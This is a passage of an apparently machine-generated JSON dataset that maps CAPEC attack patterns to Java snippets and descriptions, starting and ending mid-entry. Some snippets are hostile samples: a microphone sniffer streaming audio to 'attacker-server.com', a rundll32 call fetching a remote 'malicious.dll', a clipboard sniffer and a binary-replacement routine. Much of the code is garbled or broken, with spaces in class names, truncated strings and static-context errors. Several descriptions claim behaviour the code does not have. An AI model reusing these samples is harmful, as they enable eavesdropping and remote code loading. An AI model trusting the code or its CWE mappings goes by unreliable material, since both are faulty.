        "code_snippet": "public class CryptographicOperation {\n    private static final int CLOCK_SPEED = 1000000;\n    private static final int VOLTAGE_LEVEL = 500;\n    private static final int TEMPERATURE_THRESHOLD = 0;\n\n    public static void performCryptographicOperation(byte[] data) {\n        // CWE-1247: No protection against voltage and clock glitches\n        if (System.currentTimeMillis() % CLOCK_SPEED == 0) {\n            // Simulate clock glitch\n            try {\n                Thread.sleep(1);\n            } catch (InterruptedException e) {\n                // Ignore\n            }\n        }\n\n        // CWE-1256: Improper restriction of software interfaces to hardware features\n        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);\n        powerManager.setPowerMode(PowerManager.POWER_MODE_HIGH_PERFORMANCE);\n\n        // CWE-1319: Improper protection against electromagnetic fault injection (EM-FI)\n        // No protection against EM-FI attacks\n\n        // CWE-1332: Improper handling of faults that lead to instruction skips\n        // No protection against instruction skips\n\n        // CWE-1338: Improper protections against hardware overheating\n        // No protection against overheating\n\n        // CWE-1351: Improper handling of hardware behavior in exceptionally cold environments\n        // No protection against cold temperatures\n\n        // Perform cryptographic operation\n        try {\n            Cipher cipher = Cipher.getInstance(\"AES\");\n            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(data, \"AES\"));\n            byte[] encryptedData = cipher.doFinal(data);\n            // Return encrypted data\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a cryptographic operation that is vulnerable to fault injection attacks against mobile devices. The code lacks protection against voltage and clock glitches, electromagnetic fault injection, instruction skips, hardware overheating, and operation in exceptionally cold environments, making it susceptible to attacks that can compromise secret key information."
    },
    {
        "capec_id": "626",
        "code_snippet": "import java.awt.AWTException;\\r\nimport java.awt.Robot;\\r\nimport java.awt.event.InputEvent;\\r\nimport java.io.IOException;\\r\n\\r\npublic class TouchscreenPatternDetector {\\r\n    public static void main(String[] args) throws AWTException, IOException, InterruptedException {\\r\n        Robot robot = new Robot();\\r\n        int screenWidth = 1920;\\r\n        int screenHeight = 1080;\\r\n        int touchX = 0;\\r\n        int touchY = 0;\\r\n        int touchRadius = 10;\\r\n        int touchDelay = 100;\\r\n\\r\n        // Simulate user touches on the screen\\r\n        for (int i = 0; i < 10; i++) {\\r\n            touchX = (int) (Math.random() * screenWidth);\\r\n            touchY = (int) (Math.random() * screenHeight);\\r\n            robot.mouseMove(touchX, touchY);\\r\n            robot.mousePress(InputEvent.BUTTON1_MASK);\\r\n            robot.mouseRelease(InputEvent.BUTTON1_MASK);\\r\n            Thread.sleep(touchDelay);\\r\n        }\\r\n\\r\n        // Analyze the screen for oil smudges\\r\n        // This is a simplified example and does not actually detect oil smudges\\r\n        // In a real-world scenario, you would use image processing techniques\\r\n        System.out.println(\\",
        "description": "This Java code snippet simulates user touches on a touchscreen device and then analyzes the screen for oil smudges, which could potentially reveal the password or passcode pattern. The code uses the Robot class to simulate user input and then waits for a few seconds to analyze the screen. In a real-world scenario, image processing techniques would be used to detect the oil smudges. This code embodies the main idea of the CAPEC, which is to detect oil smudges left behind by the user's fingers to reveal the password or passcode pattern. The related CWEs, such as CWE-1300, CWE-301, CWE-1278, CWE-294, and CWE-1125, provide additional context for understanding the vulnerabilities that can be exploited in this scenario."
    },
    {
        "capec_id": "627",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class GPS Spoofing {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"localhost\");\n        byte[] gpsData = \"Spoofed GPS data\".getBytes();\n        DatagramPacket packet = new DatagramPacket(gpsData, gpsData.length, address, 12345);\n        socket.send(packet);\n        System.out.println(\"Spoofed GPS data sent\");\n    }\n}\n\npublic class GPS Receiver {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(12345);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        String gpsData = new String(packet.getData(), 0, packet.getLength());\n        System.out.println(\"Received GPS data: \" + gpsData);\n        // No verification of the source of the communication channel\n        // No verification of the integrity of the received message\n        // No authentication of the sender\n        processGPSData(gpsData);\n    }\n    public static void processGPSData(String gpsData) {\n        // Process the received GPS data without verifying its authenticity\n    }\n}",
        "description": "This Java code snippet demonstrates a GPS spoofing attack, where an adversary sends spoofed GPS data to a GPS receiver. The GPS receiver does not properly verify the source of the communication channel, the integrity of the received message, or the authenticity of the sender, making it vulnerable to the attack. The CWEs embodied in this code snippet are CWE-940 (Improper Verification of Source of a Communication Channel), CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel), and CWE-294 (Authentication Bypass by Capture-replay)."
    },
    {
        "capec_id": "628",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.InetAddress;\n\npublic class GPS_Spoofing_Attack {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"target_receiver_ip\", 12345);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-290: Authentication Bypass by Spoofing\n        String fake_gps_signal = \"SPOOFED_GPS_SIGNAL\";\n        out.writeUTF(fake_gps_signal);\n\n        // CWE-222: Truncation of Security-relevant Information\n        String truncated_gps_data = in.readUTF().substring(0, 10);\n        System.out.println(\"Truncated GPS Data: \" + truncated_gps_data);\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        InetAddress fake_destination = InetAddress.getByName(\"fake_destination_ip\");\n        out.writeUTF(fake_destination.getHostAddress());\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        String fake_source_ip = \"fake_source_ip\";\n        out.writeUTF(fake_source_ip);\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        String modified_gps_data = \"MODIFIED_GPS_DATA\";\n        out.writeUTF(modified_gps_data);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a GPS spoofing attack, where an adversary broadcasts fake GPS signals to a target receiver. The code bypasses authentication by sending a spoofed GPS signal, truncates security-relevant information, specifies an incorrect destination, fails to verify the source of the communication channel, and modifies the GPS data during transmission."
    },
    {
        "capec_id": "629",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableCode {\n    private static final String AUX_DEVICE = \"AUX\";\n    private static final String CON_DEVICE = \"CON\";\n\n    public static void main(String[] args) {\n        String userInput = \"AUX:\\\\file.txt\";\n        File file = new File(userInput);\n        if (file.exists()) {\n            try (FileWriter writer = new FileWriter(file)) {\n                writer.write(\"This is a test.\");\n            } catch (IOException e) {\n                System.out.println(\"Error writing to file.\");\n            }\n        } else {\n            System.out.println(\"File does not exist.\");\n        }\n    }\n\n    private static boolean authorizeUser(String username) {\n        // Incorrect authorization check\n        return true;\n    }\n\n    private static void consumePower() {\n        while (true) {\n            // Consume power indefinitely\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern by combining multiple CWEs. It includes CWE-67 by not handling Windows device names correctly, CWE-863 by performing an incorrect authorization check, and CWE-920 by consuming power indefinitely. Additionally, it does not release resources after their effective lifetime has ended, which is CWE-772. The code attempts to write to a file using a Windows device name, bypasses authorization checks, and consumes power excessively."
    },
    {
        "capec_id": "630",
        "code_snippet": "public class TypoSquattingAttack {\n    public static void main(String[] args) {\n        String userInput = \"www.goggle.com\";\n        String trustedDomain = \"www.google.com\";\n\n        // CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n        if (userInput.contains(\".\")) {\n            String redirectUrl = \"http://\" + userInput;\n            System.out.println(\"Redirecting to: \" + redirectUrl);\n            // Redirect user to adversary-controlled destination\n        }\n\n        // CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n        String[] invalidChars = {\"<\", \">\", \"=\"};\n        for (String invalidChar : invalidChars) {\n            if (userInput.contains(invalidChar)) {\n                System.out.println(\"Invalid character detected: \" + invalidChar);\n                // CWE-290: Authentication Bypass by Spoofing\n                // CWE-697: Incorrect Comparison\n                if (userInput.equals(trustedDomain)) {\n                    System.out.println(\"Authentication bypassed!\");\n                }\n            }\n        }\n\n        // CWE-115: Misinterpretation of Input\n        if (userInput.equalsIgnoreCase(trustedDomain)) {\n            System.out.println(\"Misinterpreted input: \" + userInput);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a TypoSquatting attack, where an adversary registers a domain name similar to a trusted domain. The code accepts user input, which may contain invalid characters or be a typo of the trusted domain. It then redirects the user to an adversary-controlled destination, potentially bypassing authentication or misinterpreting the input."
    },
    {
        "capec_id": "631",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SoundSquatting {\n    public static void main(String[] args) throws Exception {\n        String trustedDomain = \"example.com\";\n        String adversaryDomain = \"examp1e.com\";\n\n        // CWE-348: Using less trusted source\n        String userInput = System.console().readLine(\"Enter a domain: \");\n        if (userInput.equalsIgnoreCase(adversaryDomain)) {\n            URL url = new URL(\"http://\" + userInput);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.connect();\n\n            // CWE-486: Comparison of classes by name\n            if (connection.getClass().getSimpleName().equals(\"HttpURLConnection\")) {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    System.out.println(line);\n                }\n            }\n        }\n\n        // CWE-601: URL Redirection to Untrusted Site\n        String redirectUrl = \"http://\" + userInput + \"/redirect\";\n        System.out.println(\"Redirecting to: \" + redirectUrl);\n        URL redirect = new URL(redirectUrl);\n        HttpURLConnection redirectConnection = (HttpURLConnection) redirect.openConnection();\n        redirectConnection.setInstanceFollowRedirects(true);\n        redirectConnection.connect();\n\n        // CWE-350: Reliance on Reverse DNS Resolution\n        String ipAddress = \"192.0.2.1\";\n        InetAddress addr = InetAddress.getByName(ipAddress);\n        String hostname = addr.getCanonicalHostName();\n        if (hostname.equals(adversaryDomain)) {\n            System.out.println(\"Authenticated!\");\n        }\n\n        // CWE-290: Authentication Bypass by Spoofing\n        String username = \"admin\";\n        String password = \"password\";\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            System.out.println(\"Authenticated!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SoundSquatting attack, where an adversary registers a domain name that sounds similar to a trusted domain but has a different spelling. The code uses various CWEs to illustrate the attack, including CWE-348 (using a less trusted source), CWE-486 (comparing classes by name), CWE-601 (URL redirection to an untrusted site), CWE-350 (reliance on reverse DNS resolution), and CWE-290 (authentication bypass by spoofing)."
    },
    {
        "capec_id": "632",
        "code_snippet": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.regex.Pattern;\n\npublic class HomographAttack {\n    public static void main(String[] args) {\n        String userInput = \"https://paypal.com\u200b\";\n        String trustedDomain = \"https://paypal.com\";\n        if (Pattern.matches(\"^https?://[a-zA-Z0-9.-]+\", userInput)) {\n            try {\n                URI userURI = new URI(userInput);\n                URI trustedURI = new URI(trustedDomain);\n                if (userURI.getHost().equals(trustedURI.getHost())) {\n                    System.out.println(\"Redirecting to: \" + userInput);\n                    // Perform redirection or other sensitive action\n                }\n            } catch (URISyntaxException e) {\n                System.out.println(\"Invalid URI: \" + userInput);\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a homograph attack vulnerability. It takes user input in the form of a URL and checks if it matches a trusted domain using a regular expression. However, the regular expression is not anchored, allowing malicious or malformed data to slip through (CWE-777). The code also fails to properly neutralize invalid characters in the URL, making it vulnerable to homoglyph attacks (CWE-1007). Additionally, it does not ensure that the request is being sent to the expected destination, making it vulnerable to Server-Side Request Forgery (SSRF) (CWE-918). The code also does not properly handle encoded URI schemes, making it vulnerable to improper neutralization of encoded URI schemes (CWE-84). Finally, it does not neutralize invalid characters in identifiers, making it vulnerable to improper neutralization of invalid characters in identifiers (CWE-86)."
    },
    {
        "capec_id": "633",
        "code_snippet": "public class AuthenticationExploit {\n    public static void main(String[] args) {\n        // CWE-287: Improper Authentication\n        String username = \"admin\";\n        String password = \"password\";\n        boolean isAuthenticated = authenticate(username, password);\n        if (isAuthenticated) {\n            // CWE-1270: Generation of Incorrect Security Tokens\n            String securityToken = generateSecurityToken(username);\n            // CWE-1390: Weak Authentication\n            if (securityToken != null) {\n                // CWE-1259: Improper Restriction of Security Token Assignment\n                assignSecurityToken(securityToken);\n                // CWE-520: .NET Misconfiguration: Use of Impersonation\n                impersonateUser(securityToken);\n            }\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // Weak authentication mechanism\n        return true;\n    }\n\n    private static String generateSecurityToken(String username) {\n        // Incorrect security token generation\n        return \"security_token_\" + username;\n    }\n\n    private static void assignSecurityToken(String securityToken) {\n        // Improper restriction of security token assignment\n        System.out.println(\"Security token assigned: \" + securityToken);\n    }\n\n    private static void impersonateUser(String securityToken) {\n        // .NET misconfiguration: use of impersonation\n        System.out.println(\"Impersonating user with security token: \" + securityToken);\n    }\n}",
        "description": "Java code snippet demonstrating the CAPEC, where an adversary exploits weaknesses in authentication to create an access token that impersonates a different entity, and then associates a process/thread to that impersonated token, leading to a downstream user making a decision or taking action based on the assumed identity."
    },
    {
        "capec_id": "634",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport javax.sound.sampled.AudioFormat;\nimport javax.sound.sampled.AudioInputStream;\nimport javax.sound.sampled.AudioSystem;\nimport javax.sound.sampled.DataLine;\nimport javax.sound.sampled.TargetDataLine;\n\npublic class AudioSniffer {\n    public static void main(String[] args) throws LineUnavailableException, IOException {\n        TargetDataLine line = AudioSystem.getTargetDataLine(new AudioFormat(44100, 16, 2, true, false));\n        line.open();\n        line.start();\n\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(\"attacker-server.com\");\n\n        byte[] buffer = new byte[1024];\n        while (true) {\n            int numBytesRead = line.read(buffer, 0, buffer.length);\n            DatagramPacket packet = new DatagramPacket(buffer, numBytesRead, address, 12345);\n            socket.send(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerability to the CAPEC described, where an adversary exploits the target system's audio functionality to capture sensitive information. The code uses the `javax.sound.sampled` package to capture audio input from the system's microphone and sends it to a remote server using a `DatagramSocket`. This code embodies CWE-267 by using a privilege (access to the microphone) to perform an unsafe action (transmitting sensitive information). It also relates to CWE-319 by transmitting sensitive information in cleartext. Additionally, it touches on CWE-1300 by not protecting against physical side channels, CWE-497 by exposing sensitive system information, and CWE-1039 by not handling adversarial input perturbations."
    },
    {
        "capec_id": "635",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class FileHandler {\n    public void handleFile(String filename) throws IOException {\n        File file = new File(filename);\n        if (file.getName().endsWith(\\",
        "description": "This Java code snippet demonstrates the CAPEC of file extension manipulation. The handleFile method determines the application to open a file based on its extension. However, it does not properly validate the file name, allowing an attacker to manipulate the extension and cause the file to be opened with a different application, potentially leading to code execution or sensitive information exposure. The code is vulnerable to CWE-162, CWE-646, CWE-641, CWE-73, and CWE-58."
    },
    {
        "capec_id": "636",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\n\npublic class MaliciousFileStorage {\n    public static void main(String[] args) throws IOException {\n        String maliciousCode = \"<malicious_code_here>\";\n        File file = new File(\"image.jpg\");\n        Files.setAttribute(file.toPath(), \"user.comment\", maliciousCode.getBytes());\n        // Store sensitive data in cleartext in a file\n        Files.write(Paths.get(\"sensitive_data.txt\"), \"password=123456\".getBytes(), StandardOpenOption.CREATE);\n        // Store sensitive information in cleartext in an executable\n        Files.write(Paths.get(\"executable.exe\"), \"api_key=abcdef\".getBytes(), StandardOpenOption.CREATE);\n        // Covert storage channel\n        File covertFile = new File(\"covert_file.txt\");\n        Files.write(covertFile.toPath(), \"1\".getBytes(), StandardOpenOption.CREATE);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of storing malicious data or code in file metadata, which can be difficult to discover. It uses related CWEs such as embedded malicious code, storage of sensitive data under web root, cleartext storage in a file or on disk, cleartext storage of sensitive information in an executable, and covert storage channel. The code stores malicious code in the comment attribute of an image file, sensitive data in cleartext in a file, sensitive information in cleartext in an executable, and uses a covert storage channel to transfer information."
    },
    {
        "capec_id": "637",
        "code_snippet": "import java.awt.Toolkit;\nimport java.awt.datatransfer.Clipboard;\nimport java.awt.datatransfer.DataFlavor;\nimport java.awt.datatransfer.StringSelection;\nimport java.awt.datatransfer.Transferable;\nimport java.io.Console;\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class ClipboardSniffer {\n    public static void main(String[] args) {\n        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();\n        Transferable contents = clipboard.getContents(this);\n        if (contents != null && contents.isDataFlavorSupported(DataFlavor.stringFlavor)) {\n            String data = (String) contents.getTransferData(DataFlavor.stringFlavor);\n            // CWE-317: Storing sensitive information in cleartext within the GUI\n            System.out.println(\"Copied data: \" + data);\n            // CWE-318: Storing sensitive information in cleartext in an executable\n            File file = new File(\"clipboard_data.txt\");\n            try (FileWriter writer = new FileWriter(file)) {\n                writer.write(data);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            // CWE-222: Truncation of security-relevant information\n            if (data.length() > 100) {\n                data = data.substring(0, 100);\n            }\n            // CWE-267: Privilege defined with unsafe actions\n            if (System.getProperty(\"user.name\").equals(\"admin\")) {\n                // Perform unsafe action with elevated privilege\n                System.out.println(\"Performing unsafe action...\");\n            }\n            // CWE-497: Exposure of sensitive system information to an unauthorized control sphere\n            Console console = System.console();\n            if (console != null) {\n                char[] password = console.readPassword(\"Enter password: \");\n                System.out.println(\"Password: \" + new String(password));\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a clipboard sniffer that accesses and stores sensitive information in cleartext, violating multiple CWEs. It uses the system clipboard to retrieve copied data, stores it in a file, and performs unsafe actions with elevated privilege. The code also truncates security-relevant information and exposes sensitive system information to an unauthorized control sphere."
    },
    {
        "capec_id": "638",
        "code_snippet": "public class MaliciousFirmwareUpdater {\n    public static void main(String[] args) {\n        // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n        boolean isFabricAccessControlEnabled = false;\n        executeUntrustedFirmware(!isFabricAccessControlEnabled);\n\n        // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n        byte[] bootloaderCode = readBootloaderCodeFromNVM();\n        writeBootloaderCodeToVM(bootloaderCode);\n\n        // CWE-1277: Firmware Not Updateable\n        FirmwareUpdater updater = new FirmwareUpdater();\n        updater.disableFirmwareUpdates();\n\n        // CWE-1326: Missing Immutable Root of Trust in Hardware\n        boolean isSecureBootEnabled = false;\n        if (!isSecureBootEnabled) {\n            executeAdversarialBootCode();\n        }\n\n        // CWE-1220: Insufficient Granularity of Access Control\n        AccessControlPolicy policy = new AccessControlPolicy();\n        policy.setAccessControlList(new String[] {\"*\"});\n    }\n\n    private static void executeUntrustedFirmware(boolean isFabricAccessControlEnabled) {\n        // Execute untrusted firmware code\n    }\n\n    private static byte[] readBootloaderCodeFromNVM() {\n        // Read bootloader code from Non-Volatile Memory\n        return new byte[0];\n    }\n\n    private static void writeBootloaderCodeToVM(byte[] bootloaderCode) {\n        // Write bootloader code to Volatile Memory\n    }\n\n    private static void executeAdversarialBootCode() {\n        // Execute adversarial boot code\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious firmware updater that exploits various vulnerabilities to gain persistence on a system. It executes untrusted firmware code before enabling fabric access control, writes bootloader code to volatile memory without proper access control, disables firmware updates, bypasses secure boot, and sets an overly permissive access control policy."
    },
    {
        "capec_id": "639",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class InsecureFileAccess {\n    public static void main(String[] args) {\n        try {\n            File file = new File(\"sensitive_data.txt\");\n            if (!file.exists()) {\n                file.createNewFile();\n            }\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"username:password\\n\");\n            writer.close();\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of improperly protected files, allowing unauthorized access to sensitive information. The code creates a file named 'sensitive_data.txt' in the current directory and writes a username and password to it, without implementing proper access control. This file is accessible to external parties, violating CWE-552. Additionally, the code does not properly handle exceptions, potentially leading to exposure of sensitive system information (CWE-497) and insecure temporary files (CWE-377). The error message may also contain sensitive information, as per CWE-537."
    },
    {
        "capec_id": "640",
        "code_snippet": "import java.lang.Runtime;\nimport java.lang.Process;\nimport java.io.IOException;\n\npublic class DLLInjection {\n    public static void main(String[] args) {\n        try {\n            Runtime.getRuntime().exec(\"rundll32.exe, url.dll,OpenURL http://example.com/malicious.dll\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates DLL injection, which is a type of process hijacking attack. The code uses the Runtime.getRuntime().exec() method to execute a command that loads a malicious DLL file from a remote location, allowing an attacker to execute arbitrary code in the context of the running process. This code embodies CWE-114 (Process Control), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-1265 (Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls), CWE-506 (Embedded Malicious Code), and CWE-913 (Improper Control of Dynamically-Managed Code Resources)."
    },
    {
        "capec_id": "641",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class SideLoadingVulnerability {\n    public static void main(String[] args) {\n        String dllPath = \"C:\\Windows\\WinSxS\\\";\n        String dllName = \"myDLL.dll\";\n        File dllFile = new File(dllPath + dllName);\n        if (dllFile.exists()) {\n            System.load(dllPath + dllName);\n        } else {\n            System.load(dllName);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a side-loading vulnerability. It loads a DLL from the Windows Side-by-Side (WinSxS) directory without properly specifying the DLL's characteristics, making it vulnerable to an attacker placing a malicious DLL in the WinSxS directory. The code uses a fixed search path to find the DLL, which can be controlled by an unintended actor (CWE-427). If the DLL is not found in the specified path, it searches for the DLL in the system's predefined directories, which can lead to loading a malicious DLL (CWE-426). The code also uses an incorrectly-resolved name or reference to access the DLL (CWE-706)."
    },
    {
        "capec_id": "642",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String path = \"/tmp/\";\n        String binaryName = \"myBinary\";\n        String maliciousBinaryPath = \"/tmp/maliciousBinary\";\n\n        // CWE-732: Incorrect Permission Assignment for Critical Resource\n        File binaryFile = new File(path + binaryName);\n        if (binaryFile.exists()) {\n            // Change permissions to allow anyone to write\n            binaryFile.setExecutable(true, false);\n            binaryFile.setReadable(true, false);\n            binaryFile.setWritable(true, false);\n        }\n\n        // CWE-426: Untrusted Search Path\n        String searchPath = System.getProperty(\"java.library.path\") + \":\" + path;\n        System.setProperty(\"java.library.path\", searchPath);\n\n        // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n        String osCommand = \"chmod 777 \" + path + binaryName;\n        try {\n            Runtime.getRuntime().exec(osCommand);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-428: Unquoted Search Path or Element\n        String unquotedPath = \" /tmp/my dir/\";\n        List<String> command = new ArrayList<>();\n        command.add(\"cp\");\n        command.add(maliciousBinaryPath);\n        command.add(unquotedPath + binaryName);\n        try {\n            new ProcessBuilder(command).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-506: Embedded Malicious Code\n        try {\n            Runtime.getRuntime().exec(maliciousBinaryPath);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC pattern of replacing binaries with malware by exploiting weak file system permissions. It includes vulnerabilities related to incorrect permission assignment, untrusted search paths, OS command injection, unquoted search paths, and embedded malicious code."
    },
    {
        "capec_id": "643",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String sharedFolder = \"\\\\UNC\\share\\name\";\n        File folder = new File(sharedFolder);\n        if (folder.isDirectory()) {\n            File[] listOfFiles = folder.listFiles();\n            List<String> fileNames = new ArrayList<>();\n            for (File file : listOfFiles) {\n                if (file.isFile()) {\n                    fileNames.add(file.getName());\n                }\n            }\n            // Expose sensitive information to an unauthorized actor\n            System.out.println(\"Files in shared folder: \" + fileNames);\n        } else {\n            System.out.println(\"Shared folder does not exist\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of discovering connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. The code uses a Windows UNC share to access a shared folder and lists all files in the folder, exposing sensitive information to an unauthorized actor. The code also highlights CWE-267 by using a privilege to perform an unsafe action, CWE-200 by exposing sensitive information, CWE-427 by using a fixed search path, CWE-40 by using a Windows UNC share, and CWE-552 by making files accessible to external parties."
    },
    {
        "capec_id": "644",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport jcifs.smb.NtlmPasswordAuthentication;\nimport jcifs.smb.SmbSession;\n\npublic class VulnerableLMHashAuth {\n    public static void main(String[] args) {\n        try {\n            // CWE-522: Insufficiently Protected Credentials\n            // CWE-836: Use of Password Hash Instead of Password for Authentication\n            String lmHash = \"aad3b435b51404eeaad3b435b51404ee\";\n            String username = \"admin\";\n            String domain = \"mydomain\";\n            NtlmPasswordAuthentication auth = new NtlmPasswordAuthentication(domain, username, lmHash);\n            SmbSession.logon(InetAddress.getByName(\"localhost\"), auth);\n            \n            // CWE-308: Use of Single-factor Authentication\n            // CWE-294: Authentication Bypass by Capture-replay\n            // CWE-520: .NET Misconfiguration: Use of Impersonation\n            // No additional security measures are implemented to prevent capture-replay attacks\n            // or to require dual-factor authentication\n            System.out.println(\"Authentication successful!\");\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception: \" + e.getMessage());\n        } catch (IOException e) {\n            System.out.println(\"IO exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable LM hash-based authentication system, which is susceptible to various attacks. It uses a hardcoded LM hash value for authentication, without implementing any additional security measures to prevent capture-replay attacks or to require dual-factor authentication."
    },
    {
        "capec_id": "645",
        "code_snippet": "import java.net.Authenticator;\nimport java.net.PasswordAuthentication;\nimport javax.security.auth.kerberos.KerberosTicket;\nimport javax.security.auth.kerberos.ServiceTicket;\n\npublic class KerberosTicketExploit {\n    public static void main(String[] args) {\n        // CWE-522: Insufficiently Protected Credentials\n        String username = \\",
        "description": "This Java code snippet demonstrates the CAPEC of using stolen Kerberos tickets to access systems/resources. The code uses CWE-522 to store credentials in plaintext, CWE-294 to capture and replay a ticket, CWE-308 to use single-factor authentication, CWE-322 to perform a key exchange without entity authentication, and CWE-1292 to incorrectly convert security identifiers. The code captures a Kerberos ticket from the network, uses it to access a system/resource, and highlights the vulnerabilities in the Kerberos authentication protocol."
    },
    {
        "capec_id": "646",
        "code_snippet": "import java.io.File;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class DeviceEnumerator {\n    public static void main(String[] args) {\n        List<String> devices = new ArrayList<>();\n        File[] roots = File.listRoots();\n        for (File root : roots) {\n            File[] files = root.listFiles();\n            for (File file : files) {\n                if (file.isDirectory() && file.canRead()) {\n                    devices.add(file.getAbsolutePath());\n                }\n            }\n        }\n        System.out.println(\"Attached devices: \" + devices);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of obtaining information about attached peripheral devices and components connected to a computer system. It uses the CWE-200: Exposure of Sensitive Information to an Unauthorized Actor by listing all attached devices and their paths, which can be used by an adversary to gain additional insight about the system or network environment. The code also relates to CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere as it accesses system-level information without proper authorization. Additionally, it touches on CWE-67: Improper Handling of Windows Device Names as it does not handle Windows device names such as AUX or CON, potentially leading to information exposure."
    },
    {
        "capec_id": "647",
        "code_snippet": "import java.util.Properties;\nimport java.util.Enumeration;\n\npublic class RegistryExploiter {\n    public static void main(String[] args) {\n        try {\n            // CWE-285: Improper Authorization\n            // No authorization check is performed to access the system registry\n            Properties systemProps = System.getProperties();\n            Enumeration<?> e = systemProps.propertyNames();\n            while (e.hasMoreElements()) {\n                String key = (String) e.nextElement();\n                String value = systemProps.getProperty(key);\n                System.out.println(key + \" : \" + value);\n            }\n\n            // CWE-314: Cleartext Storage in the Registry\n            // Sensitive information is stored in cleartext in the registry\n            String sensitiveInfo = \"password=secret\";\n            System.setProperty(\"my.sensitive.info\", sensitiveInfo);\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            // Sensitive system information is exposed to unauthorized actors\n            String osName = System.getProperty(\"os.name\");\n            String osArch = System.getProperty(\"os.arch\");\n            System.out.println(\"OS Name: \" + osName);\n            System.out.println(\"OS Arch: \" + osArch);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exploiting weaknesses in authorization to gather system-specific data and sensitive information within a registry. It lacks proper authorization checks, stores sensitive information in cleartext, and exposes sensitive system information to unauthorized actors."
    },
    {
        "capec_id": "648",
